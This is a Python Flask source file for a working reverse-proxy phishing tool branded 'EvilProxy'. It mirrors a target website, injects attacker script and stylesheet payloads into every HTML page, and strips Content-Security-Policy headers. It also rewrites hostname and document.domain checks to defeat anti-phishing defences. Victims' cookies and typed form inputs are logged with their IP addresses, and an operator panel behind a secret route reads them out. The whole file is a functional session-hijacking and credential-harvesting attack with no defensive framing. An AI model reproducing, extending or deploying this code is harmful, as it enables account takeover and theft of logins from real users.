import requests, re, json, os, brotli, gzip
from io import BytesIO
from datetime import datetime
from flask import Flask, request, Response, send_from_directory, jsonify, redirect

if not os.path.exists('cookies.json'):
    with open('cookies.json', 'w') as f:
        json.dump([], f)

if not os.path.exists('inputs.json'):
    with open('inputs.json', 'w') as f:
        json.dump([], f)

def start_proxy(target, host, port, secret):
    app = Flask(__name__)

    payloads = [i for i in os.listdir('proxy/payloads') if os.path.isfile(os.path.join('proxy/payloads', i))]
    scripts = [i for i in payloads if i.endswith('.js')]
    styles = [i for i in payloads if i.endswith('.css')]

    @app.route(f'/{secret}')
    def panel_index():
        return send_from_directory('panel', 'index.html')

    @app.route('/ep/assets/EvilProxyIcon.png')
    def panel_icon():
        return send_from_directory('panel', 'EvilProxyIcon.png')

    @app.route('/ep/assets/EvilProxyBanner.png')
    def panel_banner():
        return send_from_directory('panel', 'EvilProxyBanner.png')
    
    @app.route('/ep/assets/app.js')
    def panel_app():
        return send_from_directory('panel', 'app.js')

    @app.route('/ep/assets/styles.css')
    def panel_styles():
        return send_from_directory('panel', 'styles.css')

    @app.route('/ep/api/ping', methods=['POST'])
    def log_cookies():
        cookies = request.cookies
        user_ip = request.remote_addr
        timestamp = datetime.now().isoformat()

        cookie_data = []
        for key, value in cookies.items():
            cookie_data.append({
                'name': key,
                'value': value,
                'timestamp': timestamp,
                'ip': user_ip
            })

        with open('cookies.json', 'r') as f:
            existing_cookies = json.load(f)

        existing_cookies.extend(cookie_data)

        with open('cookies.json', 'w') as f:
            json.dump(existing_cookies, f)

        return jsonify({'message': 'Pong!'}), 200

    @app.route('/ep/api/getCookies', methods=['GET'])
    def get_cookies():
        with open('cookies.json', 'r') as f:
            cookies = json.load(f)

        response_data = []
        for cookie in cookies:
            logged_time = datetime.fromisoformat(cookie['timestamp'])
            time_diff = datetime.now() - logged_time
            seconds_ago = time_diff.total_seconds()
            
            if seconds_ago < 60:
                time_str = f'Logged: {int(seconds_ago)} seconds ago'
            elif seconds_ago < 3600:
                time_str = f'Logged: {int(seconds_ago // 60)} minutes ago'
            elif seconds_ago < 86400:
                time_str = f'Logged: {int(seconds_ago // 3600)} hours ago'
            elif seconds_ago < 31536000:
                time_str = f'Logged: {int(seconds_ago // 86400)} days ago'
            else:
                time_str = f'Logged: {int(seconds_ago // 31536000)} years ago'

            response_data.append({
                'name': cookie['name'],
                'value': cookie['value'],
                'ip': cookie['ip'],
                'timestamp': time_str
            })

        return jsonify(response_data), 200

    @app.route('/ep/api/science', methods=['POST'])
    def log_inputs():
        user_ip = request.remote_addr
        timestamp = datetime.now().isoformat()
        json_data = request.json

        if isinstance(json_data, dict) and len(json_data) == 1:
            key, value = next(iter(json_data.items()))
            log_data = {
                'key': key,
                'value': value,
                'timestamp': timestamp,
                'ip': user_ip
            }

            with open('inputs.json', 'r') as f:
                existing_logs = json.load(f)

            existing_logs.append(log_data)

            with open('inputs.json', 'w') as f:
                json.dump(existing_logs, f)

            return jsonify({'message': 'Fused!'}), 200

    @app.route('/ep/api/getInputs', methods=['GET'])
    def get_inputs():
        with open('inputs.json', 'r') as f:
            inputs = json.load(f)

        response_data = []
        for i in inputs:
            logged_time = datetime.fromisoformat(i['timestamp'])
            time_diff = datetime.now() - logged_time
            seconds_ago = time_diff.total_seconds()
            
            if seconds_ago < 60:
                time_str = f'Logged: {int(seconds_ago)} seconds ago'
            elif seconds_ago < 3600:
                time_str = f'Logged: {int(seconds_ago // 60)} minutes ago'
            elif seconds_ago < 86400:
                time_str = f'Logged: {int(seconds_ago // 3600)} hours ago'
            elif seconds_ago < 31536000:
                time_str = f'Logged: {int(seconds_ago // 86400)} days ago'
            else:
                time_str = f'Logged: {int(seconds_ago // 31536000)} years ago'

            response_data.append({
                'name': i['key'],
                'value': i['value'],
                'ip': i['ip'],
                'timestamp': time_str
            })

        return jsonify(response_data), 200

    @app.route('/ep/api/getPayloads', methods=['GET'])
    def get_payloads():
        return jsonify(payloads), 200

    @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
    @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
    def proxy(path):
        # Get the actual host from the request
        current_host = request.headers.get('Host')
        
        if request.host.startswith('localhost') and request.scheme == 'https':
            http_url = f"http://{current_host}/{path}"
            return redirect(http_url, code=302)

        if path in payloads:
            return send_from_directory('payloads', path)

        target_url = f"https://{target}/{path}"

        headers = {key: value for key, value in request.headers.items() if key.lower() not in ['host']}
        headers['Host'] = target

        if 'Cookie' in request.headers:
            cookies = request.headers['Cookie'].replace(current_host, target)
            headers['Cookie'] = cookies

        resp = requests.request(
            request.method,
            target_url,
            headers=headers,
            params=request.args,
            data=request.form,
            allow_redirects=False
        )

        response_headers = {key: value for key, value in resp.headers.items() if key.lower() not in ['content-encoding', 'transfer-encoding', 'date', 'server', 'connection', 'content-security-policy']}

        # Brotli Encoding Handler
        resp_content = resp.content
        if 'content-encoding' in resp.headers and 'br' in resp.headers['content-encoding']:
            try:
                resp_content = brotli.decompress(resp.content)
            except brotli.error:
                pass

        # Gzip Encoding Handler
        if 'content-encoding' in resp.headers and 'gzip' in resp.headers['content-encoding']:
            try:
                buf = BytesIO(resp.content)
                resp_content = gzip.decompress(buf.read())
            except OSError:
                pass

        if 'content-type' in resp.headers and 'text/html' in resp.headers['content-type']:
            resp_content = resp_content.decode('utf-8')
            
            # Payload Injection
            injections = ''.join([f'<script src="/{i}"></script>' for i in scripts])
            injections += ''.join([f'<link rel="stylesheet" href="{i}">' for i in styles])
            resp_content = re.sub(r'<head>', r'<head>' + injections, resp_content)
            
            # Fixes
            if request.host.startswith('localhost'):
                resp_content = resp_content.replace('https', 'http')

            resp_content = resp_content.replace(f'//{target}', f'//{host}:{port}')

            resp_content = resp_content.encode('utf-8')

        else:
            resp_content = resp_content.decode('utf-8')

            # Bypasses
            resp_content = resp_content.replace('window.location.hostname', target)
            resp_content = resp_content.replace('window.location.host', target)
            resp_content = resp_content.replace('document.domain', target)

            if request.host.startswith('localhost'):
                resp_content = resp_content.replace('https', 'http')

            resp_content = resp_content.encode('utf-8')

        for key in response_headers:
            response_headers[key] = response_headers[key].replace(target, current_host)

        return Response(resp_content, status=resp.status_code, headers=response_headers)

    app.run(host=host, port=port, threaded=True)